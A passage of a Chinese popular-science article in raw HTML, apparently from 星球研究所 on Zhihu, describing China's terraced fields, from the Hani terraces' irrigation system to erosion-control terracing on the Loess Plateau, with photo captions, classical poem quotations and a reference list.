data-watermark-src=\"v2-71aca61af07f043f44530358080b21f4\" data-private-watermark-src=\"v2-c82733523b15238f3fc76bc12ba4246d\"></p>\n<p>在这个系统的最高处是哀牢山茂密的<b>森林。</b></p>\n<p>森林吸纳降水，形成溪泉，并向下流淌。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-93939725762af9f865590820834c1ec3_720w.webp?rss\" data-caption=\"哀牢山上的高山森林，摄影师@柴峻峰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-93939725762af9f865590820834c1ec3\" data-watermark-src=\"v2-4a0556833f0d4f80e9be5709463aabb2\" data-private-watermark-src=\"v2-10fdb9aa266656ec9c2d74f3c92d2169\"></p>\n<p>森林之下，海拔800-1500米之间，哈尼族在此建立<b>村寨，</b>并通过挖沟修渠引水入村以满足人畜所需。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-04a71a45254fd128113eb9844cb864da_720w.webp?rss\" data-caption=\"森林之下的哈尼族村寨，摄影师@崔永江\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1693\" data-watermark=\"original\" data-original-src=\"v2-04a71a45254fd128113eb9844cb864da\" data-watermark-src=\"v2-5a64234723d3a210c94dd79bba6b0210\" data-private-watermark-src=\"v2-35bfd2ec3fc52340e49bdfc5989ccd00\"></p>\n<p>再往下，溪水裹挟着森林与村寨中的营养物质，进入村寨下方的<b>梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-14ce8c74dc8afad2a6590761068eefc8_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@刘珠明\" data-size=\"normal\" data-rawwidth=\"888\" data-rawheight=\"1332\" data-watermark=\"original\" data-original-src=\"v2-14ce8c74dc8afad2a6590761068eefc8\" data-watermark-src=\"v2-a28166ee286efa39f3e062fc9eff66d8\" data-private-watermark-src=\"v2-49c5d8b87402ce42cc2730abef72f2cd\"></p>\n<p>为保证大小不一的梯田得到相对均衡的供水，当地人还在水沟中设置木桩，木桩上刻出大小不同的槽口，从而实现水量合理分配，是为<b>木刻分水。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1b961f01221a1ef2e2ed157e1a86e411_720w.jpg?rss\" data-caption=\"木刻分水是哈尼族在梯田用水方面的一大智慧创造，下图为八口分水器，会将一条溪水分散到八块不同的梯田，摄影师@张洪科\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1411\" data-watermark=\"original\" data-original-src=\"v2-1b961f01221a1ef2e2ed157e1a86e411\" data-watermark-src=\"v2-faa8fa7a76426f28084055f9874f2109\" data-private-watermark-src=\"v2-122608515aeb95275fd454918af40681\"></p>\n<p>再往下，溪水经过层层梯田，最终在山谷底部汇入<b>江河</b>之中，炎热的河谷又将河水蒸发到空中，再次汇集到高山森林，重新形成雾水，终而复始地进行循环。</p>\n<p>在容易出现<b>干旱</b>的云南，「森林-村寨-梯田-水系」四素同构的体系，却可以让哈尼梯田保持持续不断的水源供给。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fac1f2f98c89f18fa6bc58dfc0f88080_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@潘泉\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1512\" data-watermark=\"original\" data-original-src=\"v2-fac1f2f98c89f18fa6bc58dfc0f88080\" data-watermark-src=\"v2-f9c5123154ee356c7a1e1bba809a375a\" data-private-watermark-src=\"v2-6b7e9f16968bb3ffb9dd4f2efebd8298\"></p>\n<p>凭借这样的智慧，哈尼族建造出了总面积高达100万亩的梯田。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-907960b4935fac0ebcab19666ab83068_720w.webp?rss\" data-caption=\"云南红河哈尼梯田鳞次栉比排布于高山之中，摄影师@林宇先\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-907960b4935fac0ebcab19666ab83068\" data-watermark-src=\"v2-1612ba638b1a7de28e775ee55dabb53b\" data-private-watermark-src=\"v2-a8fdc1df479a4491b099a98335af37bf\"></p>\n<p>梯田层级可以达3000多级，垂直落差2000多米，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4fd4676dfe16701986741a29fd1d0c25_720w.webp?rss\" data-caption=\"空中俯瞰云南红河哈尼梯田，摄影师@胡艳辉\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-4fd4676dfe16701986741a29fd1d0c25\" data-watermark-src=\"v2-6cb823d3bbf14ea96601268ccafcb3a7\" data-private-watermark-src=\"v2-5104262431b5b8c75b40dc2e54d8c20b\"></p>\n<p>平均坡度约20°，最大可达约60°。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-33e9418e14ac59c50cf0f48d7ab5bca4_720w.webp?rss\" data-caption=\"修建在山脊间的云南红河哈尼梯田，摄影师@邱会宁\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1844\" data-watermark=\"original\" data-original-src=\"v2-33e9418e14ac59c50cf0f48d7ab5bca4\" data-watermark-src=\"v2-c31d49a316593c92076161719841a3c1\" data-private-watermark-src=\"v2-12982f8ec8109befd5a5cd4422565266\"></p>\n<p>当你从高处俯瞰，一望无际、层层叠叠的梯田如同排山倒海地袭来，几乎撑满你的眼眶。</p>\n<p>如流动的乐谱，</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bdf9f621ce6ec3ca9de0c50fff2462ba_720w.jpg?rss\" data-caption=\"云南红河哈尼梯田，摄影师@王超\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1947\" data-watermark=\"original\" data-original-src=\"v2-bdf9f621ce6ec3ca9de0c50fff2462ba\" data-watermark-src=\"v2-d1ee31880f39ac7e69215b8ce94a7fa0\" data-private-watermark-src=\"v2-16ab88b7e3c9a65a2e8c6b646f4b5412\"></p>\n<p>如多彩的画盘，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f8fe2a158e48ce7dae0c92d2c9b88dc_720w.jpg?rss\" data-caption=\"云南红河哈尼梯田，摄影师@张殿文\" data-size=\"normal\" data-rawwidth=\"889\" data-rawheight=\"1333\" data-watermark=\"original\" data-original-src=\"v2-9f8fe2a158e48ce7dae0c92d2c9b88dc\" data-watermark-src=\"v2-dea7d7841b04b3b3dac1481635ddb7b8\" data-private-watermark-src=\"v2-a8595a8612b20005e699c5aad09cf5af\"></p>\n<p>如变幻的宝镜，</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic1.zhimg.com/v2-294c8434e35c1f65d652defc9b0638a9_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@嘉楠\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2318\" data-watermark=\"original\" data-original-src=\"v2-294c8434e35c1f65d652defc9b0638a9\" data-watermark-src=\"v2-d7339a0e2cabcbbe6809052d67769e61\" data-private-watermark-src=\"v2-b8aa118848d01295b176371399ff83c6\"></p>\n<p>令你不得不感叹，这是何等的雄伟秀丽。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c81f0512d2ff2340885e6d010d9e3b9_720w.webp?rss\" data-caption=\"沉浸在朝阳之中的云南红河哈尼梯田，摄影师@陈小羊\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2909\" data-watermark=\"original\" data-original-src=\"v2-1c81f0512d2ff2340885e6d010d9e3b9\" data-watermark-src=\"v2-2b47a2cc7f70d2c0e5efabd01ebd7c1f\" data-private-watermark-src=\"v2-98e788db362f692f65357a9c895d95b9\"></p>\n<p>而梯田中的稻谷除了食用外，稻谷的秸秆还会被用来搭建独具特色的<b>「蘑菇房」</b>，因状如蘑菇而得名。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c2af9dd5ed2a9c9a851e1045939d7353_720w.webp?rss\" data-caption=\"云南哈尼族民居，其房顶依旧沿用传统的蘑菇房样式，摄影师@熊可\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-c2af9dd5ed2a9c9a851e1045939d7353\" data-watermark-src=\"v2-192c7ec7cfecbcfb2e79ac0d3c5da5f0\" data-private-watermark-src=\"v2-ec103e1b66ea07bfd0c87f50bc75edef\"></p>\n<p>就这样，古人在西南山地创造了梯田奇迹。</p>\n<p>而在新的时期，梯田将不止于是山地族群的生存寄托，更成为了改善生态环境的力量。</p>\n<hr>\n<h2><b>03 新的使命</b></h2>\n<p>在新中国成立之后，如何治理<b>黄土高原水土流失</b>成为一项亟待解决的任务。</p>\n<p>梯田，这一起源于北方，壮大于南方的耕地形式，开始重新在北方大规模扩展开来。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7b9039380f632395249134b49ca4fd15_720w.webp?rss\" data-caption=\"黄土高原上的梯田，摄影师@任世明\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-7b9039380f632395249134b49ca4fd15\" data-watermark-src=\"v2-cc77ba285604dd6cef45220242a05737\" data-private-watermark-src=\"v2-ab6236513865f8df41e549d853d4ceb6\"></p>\n<p>自20世纪60年代开始，我国开始在黄土高原大量修建梯田，<b>甘肃庄浪梯田</b>便是新一代梯田的典范。</p>\n<p>庄浪县位于甘肃东部，全县90%以上的土地都为沟壑纵横的黄土山地，水土流失严重，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-74f67611eba189d02fe76c35a4a5b6b0_720w.png?rss\" data-caption=\"庄浪地形示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-74f67611eba189d02fe76c35a4a5b6b0\" data-watermark-src=\"v2-02cdf20104d609642a71f6b097a7a5cf\" data-private-watermark-src=\"v2-1e722657c3c696b7a61a4ddf98164ef3\"></p>\n<p>而面对降雨，<b>梯田</b>比<b>坡地</b>可以有效减少水土流失，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2843eeccccb9cbd81015c39de58c66be_720w.gif?rss\" data-caption=\"坡地和台地降水对比，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"902\" data-watermark=\"original\" data-original-src=\"v2-2843eeccccb9cbd81015c39de58c66be\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>并增加有效光照面积，更加适宜作物的生长。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a0a7e4408c7b69a2ab032e3b1c4b2777_720w.webp?rss\" data-caption=\"台地与坡地种植区光照面积对比，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1546\" data-watermark=\"original\" data-original-src=\"v2-a0a7e4408c7b69a2ab032e3b1c4b2777\" data-watermark-src=\"v2-9dab24dc568d868002691a82a0d8c125\" data-private-watermark-src=\"v2-470ce946ba9522d69cb40335f10d1ba0\"></p>\n<p>于是，经过将近60年的努力，庄浪县94.5万亩坡地修成了平展的梯田，占全县山地面积的91.74%。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-190fac717684d8d856fbb0eb66974932_720w.webp?rss\" data-caption=\"甘肃平凉庄浪梯田，摄影师@王璐\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-190fac717684d8d856fbb0eb66974932\" data-watermark-src=\"v2-c56d62210d660c74d2ba5c048acadb36\" data-private-watermark-src=\"v2-c4ff130f021bef2165a2fe21c5b06710\"></p>\n<p>再加上配套修建水库、水窖、淤地坝等水利设施，以及覆盖地膜、修建日光温室、配套养猪场等方式，庄浪从一片贫瘠的土地蜕变成蔬菜和肉产品的供应基地，并成为第一个<b>「中国梯田化模范县」。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1932743ae81b778139e40a4d0d0934de_720w.webp?rss\" data-caption=\"正在进行铺膜作业的农民，合理使用地膜，具有保温和减少水分挥发等作用，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-1932743ae81b778139e40a4d0d0934de\" data-watermark-src=\"v2-7fc66671db6895c59b4c7040b54d852f\" data-private-watermark-src=\"v2-99d3e3f646a010f6da24bdee4a52e895\"></p>\n<p>除了庄浪，在黄河流域的很多地方，梯田都被用于水土流失的治理。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-afab6660aca15d05f449fb8020917efd_720w.png?rss\" data-caption=\"黄河中上游梯田分布示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-afab6660aca15d05f449fb8020917efd\" data-watermark-src=\"v2-e11f0c6dacc154821049d1a299f46fbc\" data-private-watermark-src=\"v2-3171650319e522067a5949b65bca8191\"></p>\n<p>在陕西铜川，当地人修建了<b>宜君梯田，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-533d48dbd7014e73bd9c687b1943f5d7_720w.webp?rss\" data-caption=\"陕西铜川宜君梯田，摄影师@王佳\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1511\" data-watermark=\"original\" data-original-src=\"v2-533d48dbd7014e73bd9c687b1943f5d7\" data-watermark-src=\"v2-2258862cd210577bed68943bba29e79d\" data-private-watermark-src=\"v2-d8325541e56ecdbd56001bb786717c07\"></p>\n<p>在渭南的黄土高原上，当地人修建了<b>蒲城梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-98d8b75193d3ad65a041d00060b5971f_720w.webp?rss\" data-caption=\"陕西渭南蒲城县的梯田，摄影师@射虎\" data-size=\"normal\" data-rawwidth=\"1074\" data-rawheight=\"3000\" data-watermark=\"original\" data-original-src=\"v2-98d8b75193d3ad65a041d00060b5971f\" data-watermark-src=\"v2-4b747df0407fad610772772ec7e25a25\" data-private-watermark-src=\"v2-3cf3e173e0c13dd769762c12e2ae4f52\"></p>\n<p>经过几十年的努力，再加上其他配套措施，黄土高原流域减少了约5万亿吨的泥沙流失。如果将这些泥沙堆成高1米、宽1米的沙堤，可绕地球赤道8圈。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-72d1e488bf1e34e8dff51d8aa3e5c28e_720w.webp?rss\" data-caption=\"近60年来黄土高原水平梯田面积与输沙量变化，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1906\" data-watermark=\"original\" data-original-src=\"v2-72d1e488bf1e34e8dff51d8aa3e5c28e\" data-watermark-src=\"v2-2d56884d3053a1edeeb1c8f8b00e5a31\" data-private-watermark-src=\"v2-7aa569232f8d1b1da5623dee36956b52\"></p>\n<p>此外，在河南林州，人们随山就势开垦出<b>石板岩大垴（nǎo）梯田、西井山梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9433c3e95fc8f15ada3636c900112fa5_720w.webp?rss\" data-caption=\"雪后的河南林州西井山梯田，摄影师@刘辰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-9433c3e95fc8f15ada3636c900112fa5\" data-watermark-src=\"v2-3a27b5bf48303ad4cfb66dd1c162f28b\" data-private-watermark-src=\"v2-ba6f71bd6097f62616e5ccfd71046b95\"></p>\n<p>在河北<b>阳原县，</b>人们在山坡上开垦出<b>旱作梯田，</b>种植着当地特色作物。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-be2dcca75ff31b150889500854ed1496_720w.webp?rss\" data-caption=\"河北张家口阳原旱作梯田，摄影师@陈剑峰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-be2dcca75ff31b150889500854ed1496\" data-watermark-src=\"v2-8e99a7225420682786e7186d2c4dc7dc\" data-private-watermark-src=\"v2-945de8f7e083aa47540114a7a816182c\"></p>\n<p>而伴随着时代发展，一些梯田也开始逐渐结束了历史使命。</p>\n<p>梯田作为人类向大山索取的土地，适度的开发有利于人类的发展，过度的开发则会破坏环境。</p>\n<p>为保护生态，按照2016年颁布的《“十三五”生态环境保护规划》，<i><b>「在具备条件的25度以上坡耕地</b></i></p>\n<p><i><b>实施退耕还林还草」，</b></i>许多梯田开始由耕地还原为草地与林地。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2fbbae819adbe1579153a388c85517d2_720w.webp?rss\" data-caption=\"几十年坚持飞播造林后郁郁葱葱的林州太行山，摄影师@李建斌\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-2fbbae819adbe1579153a388c85517d2\" data-watermark-src=\"v2-853541b216a8e200a79bfecae09f4801\" data-private-watermark-src=\"v2-455509c53e22b51508ea5a96b1ab4d63\"></p>\n<p>但梯田并不会完全退出历史的舞台，它依旧遍布中华大地。</p>\n<p>上饶灵山梯田、建德胥岭梯田、云和梅源梯田、永嘉茗岙梯田、筠连高坎梯田、肇兴堂安梯田、甘洛普昌梯田、酉阳花田梯田、昔阳大寨梯田、崇礼塞北梯田、涉县旱作梯田、吕梁柳林梯田、临海黄坦梯田、仙居公盂梯田、旌德兴隆梯田、固始锁口梯田、十八盘登山梯田、朝阳八盘沟梯田、遂昌南尖岩梯田、上虞覆卮山梯田......每一处梯田都是历史的见证，是绝佳的风景。</p>\n<p>它是<b>「开荒南野际，守拙归园田」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-71e7a940f590cc9d4c10a446c687e31e_720w.webp?rss\" data-caption=\"诗句出自陶渊明《归园田居·其一》，图为贵州丹寨梯田，摄影师@姚朝辉\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1845\" data-watermark=\"original\" data-original-src=\"v2-71e7a940f590cc9d4c10a446c687e31e\" data-watermark-src=\"v2-fa0cc921f0d8437eda81315afad6bf0b\" data-private-watermark-src=\"v2-3f5e9c575a77606b2c65ee0eaf468ec0\"></p>\n<p>它是<b>「招邀过邻里，款曲话桑麻」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5d4b93d2d3cf4c611aff0b7de782eb42_720w.webp?rss\" data-caption=\"诗句出自陈必复《村家》，图为云南元阳梯田，摄影师@崔永江\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-5d4b93d2d3cf4c611aff0b7de782eb42\" data-watermark-src=\"v2-fafe18bc34b4ebb8bce25900bdc4d74c\" data-private-watermark-src=\"v2-dd0b6781c3f19d73126b0a849328098a\"></p>\n<p>它是<b>「白水明田外，碧峰出山后」，</b></p>\n<p>（诗句出自王维《新晴野望》，下图为浙江台州仙居公盂梯田，摄影师@陈世丰）</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-89fc95d1e87698ebaff4f6a68c3ca07a_720w.webp?rss\" data-caption=\"诗句出自王维《新晴野望》，图为浙江台州仙居公盂梯田，摄影师@陈世丰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-89fc95d1e87698ebaff4f6a68c3ca07a\" data-watermark-src=\"v2-eb561354e8b79e5135d4bc78dbc224c3\" data-private-watermark-src=\"v2-39aff266c460f7aa52eab10792873914\"></p>\n<p>它是<b>「晨兴理荒秽，带月荷锄归」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-37f8fb36eb7791268e5153427a4bd1d0_720w.webp?rss\" data-caption=\"诗句出自陶渊明《归园田居·其三》，图为广西龙胜龙脊梯田，摄影师@邱新生\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-37f8fb36eb7791268e5153427a4bd1d0\" data-watermark-src=\"v2-5394ea75a4577563b88013be52540eac\" data-private-watermark-src=\"v2-76c1737cdf15da0a784e94cdc942200a\"></p>\n<p>它是<b>「几处闲田，隔水动春锄」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5075316ac6c8b395496920ad70caefe8_720w.webp?rss\" data-caption=\"诗句出自张炎《渡江云·山阴久客一再逢春回忆西杭渺然愁思》，图为云南红河哈尼梯田，摄影师@廖志远\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-5075316ac6c8b395496920ad70caefe8\" data-watermark-src=\"v2-3854fb8c1d855ccf332baae69d145b50\" data-private-watermark-src=\"v2-2d3d125f46c44d85a18c2828287dd23b\"></p>\n<p>它是<b>「一水护田将绿绕，两山排闼送青来」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d2665cb931bba917b73db5d067045fbe_720w.webp?rss\" data-caption=\"诗句出自王安石《书湖阴先生壁二首》，图为浙江遂昌湖山梯田，摄影师@舒同才\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1724\" data-watermark=\"original\" data-original-src=\"v2-d2665cb931bba917b73db5d067045fbe\" data-watermark-src=\"v2-662cb30d2508d684b15e70c1b4edcaf3\" data-private-watermark-src=\"v2-a1d1d897d7758f53044e48e12638e29d\"></p>\n<p>它是<b>「田家几日闲，耕种从此起」。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6f04b8912f260a49580e87d683908e0a_720w.webp?rss\" data-caption=\"诗句出自韦应物《观田家》，图为湖北宣恩木笼古村寨之中的梯田，摄影师@文林\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-6f04b8912f260a49580e87d683908e0a\" data-watermark-src=\"v2-220f0181d2c83659cc44186d067f33ab\" data-private-watermark-src=\"v2-04cdcae434182aa06f6d9fb82cf71edf\"></p>\n<p>梯田，于无声处改变着中国。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4e01a71076e264982aedfe9f91ece308_720w.webp?rss\" data-caption=\"贵州黔南平塘的梯田，摄影师@酷鸟魏建\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-4e01a71076e264982aedfe9f91ece308\" data-watermark-src=\"v2-bce42bb601f689c179d53ff1ab3c79fb\" data-private-watermark-src=\"v2-ed8b3b31600abad43fd2aedcdeb0e650\"></p>\n<p>作为<b>立体绿化</b>的一部分，它让绿色驻留，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2b3843511208921c53afb26f1bcdf6b6_720w.webp?rss\" data-caption=\"贵州毕节大方奢香古镇中的城中花海梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-2b3843511208921c53afb26f1bcdf6b6\" data-watermark-src=\"v2-c5785cace00a2b9aa83a3a23a85179d9\" data-private-watermark-src=\"v2-0394fd540fd0d6d4d917a5181225e4ba\"></p>\n<p>它让大地多彩，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-60a05f0ada25012aa5605093bd6a00df_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@卢文\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1703\" data-watermark=\"original\" data-original-src=\"v2-60a05f0ada25012aa5605093bd6a00df\" data-watermark-src=\"v2-fa73f3b44dfabc1bb51ac988dbbe0b06\" data-private-watermark-src=\"v2-e7c8e09d0103c8083d80914deca40c58\"></p>\n<p>它让故乡如诗，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3c818402877954c673795653304e2b0f_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@何俊云\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-3c818402877954c673795653304e2b0f\" data-watermark-src=\"v2-26117f92517d8b1c525f11fa1114c139\" data-private-watermark-src=\"v2-b66581b2ec61df9d737b445c4db838cd\"></p>\n<p>它让丰收连年，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-70d798e26e72c0e34121c0fef9812024_720w.webp?rss\" data-caption=\"安徽黄山呈坎灵山梯田，摄影师@堂少\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-70d798e26e72c0e34121c0fef9812024\" data-watermark-src=\"v2-5df76aa30312a933be980a37af1c78db\" data-private-watermark-src=\"v2-8808b628bb8bf27c4066f9fe71ee0ef2\"></p>\n<p>梯田里不仅有千百年来中国人的汗水，还有着人与大山之间的默契。</p>\n<p>通过梯田，我们能读懂古人生存的往昔，也能看到今人改变的未来。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic4.zhimg.com/v2-06f6aabc205dd021b7f3291fdb7aa19b_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@卢文\" data-size=\"normal\" data-rawwidth=\"902\" data-rawheight=\"3033\" data-watermark=\"original\" data-original-src=\"v2-06f6aabc205dd021b7f3291fdb7aa19b\" data-watermark-src=\"v2-c3303dcfeec6bd0f38c2b789a77210f3\" data-private-watermark-src=\"v2-b5c999c650ec4b7bb72e5229e1835ca3\"></p>\n<p>全文完，感谢阅读。</p>\n<hr>\n<p><b>本文创作团队</b></p>\n<ul>\n<li>\n<b>撰文：</b> 河边的卡西莫多 </li>\n<li>\n<b>编辑：</b>所长</li>\n<li>\n<b>图片：</b> 潘晨霞 </li>\n<li>\n<b>地图：</b>郑艺</li>\n<li>\n<b>设计：</b>王申雯 </li>\n<li>\n<b>审校：</b>张照 丁佳昕 陈志浩</li>\n</ul>\n<p><br></p>\n<p><b>头图摄影师：</b>傅鼎</p>\n<p><b>封面摄影师：</b>韦革宁 万贲</p>\n<p><br></p>\n<p><b>专家审核</b></p>\n<ul><li>清华大学地球系统科学系 俞乐研究员</li></ul>\n<p><br></p>\n<p><b>本文主要参考文献</b></p>\n<ul>\n<li>[1]李根蟠著. 中国古代农业[M]. 北京：商务印书馆, 1998.</li>\n<li>[2]刘兴林著. 先秦两汉农业与乡村聚落的考古学研究[M]. 北京：文物出版社, 2017.</li>\n<li>[3]梁家勉著；倪根金主编. 梁家勉农史文集[M]. 北京：中国农业出版社, 2002.</li>\n<li>[4]红河哈尼族彝族自治州旅游发展委员会编. 千年哈尼梯田[M]. 云南出版集团；云南人民出版社, 2015.</li>\n<li>[5]闵庆文，田密主编；张红榛，角媛梅，刘珊副主编. 云南红河哈尼稻作梯田系统[M]. 北京：中国农业出版社, 2015.</li>\n<li>[6]史军超，白海思主编. 首届哈尼梯田大会（中国·红河）论文集[M]. 昆明：云南人民出版社, 2012.</li>\n<li>[7]（美）马立博著；关永强，高丽洁译. 海外中国研究文库 中国环境史 从史前到现代[M]. 北京：中国人民大学出版社, 2015.</li>\n<li>[8]曹博文,俞乐，Victoria Naipal, Philippe Ciais,李伟，赵圆圆，卫伟，陈蝶，刘壮，宫鹏. A 30 m terrace mapping in China using Landsat 8 imagery and digital elevation model based on the Google Earth Engine[J]. Earth System Science Data, 2021.</li>\n<li>[9]李含琳.我国山地农村实施梯田改造升级工程的可行性分析——以甘肃省的情况分析为基础[J].天水行政学院学报,2016.</li>\n<li>[10]姚云峰,王礼先. 我国梯田的形成与发展[J]. 中国水土保持,1991.</li>\n<li>[11]陈桃金,刘维,赖格英,赖怡恬,吴青,李世伟.江西崇义客家梯田的起源与演变研究[J].江西科学,2017.</li>\n<li>[12]曾雄生.唐宋时期的畬田与畬田民族的历史走向[J].古今农业,2005.</li>\n<li>[13]刘伟,康健.近七十年来明清棚民研究的回顾与反思[J].农业考古,2018.</li>\n<li>[14]马岑晔.哈尼族梯田灌溉管理系统探析[J].红河学院学报,2009.</li>\n<li>[15]角媛梅,杨有洁,胡文英,速少华.哈尼梯田景观空间格局与美学特征分析[J].地理研究,2006.</li>\n<li>[16]焦雯珺,闵庆文.紫鹊界梯田:山地自流灌溉系统的典型代表[J].中国投资,2018.</li>\n<li>[17]韦妮妮.景观型农业文化遗产保护性旅游开发探究——以广西龙胜龙脊梯田为例[J].农业农村部管理干部学院学报,2019.</li>\n<li>[18]梁淑巧.艰苦奋战三十年 庄浪坡地变梯田[J].中国水土保持,1997.</li>\n<li>[19]王志刚,何煜,王红.庄浪县梯田深层次开发的思考[J].中国水土保持,2009.</li>\n<li>[20]贾志宏,袁莉.庄浪梯田产业道路建设发展综述[J].中国农业信息,2012.</li>\n<li>[21]程志立.庄浪梯田化建设与黄土丘陵地区生态建设的启示[J].农业与技术,2014.</li>\n</ul>\n<p><br></p>\n<p><b>星球研究所，一群国家地理控，专注于探索极致世界</b></p>\n<p><b>···THE END···</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a 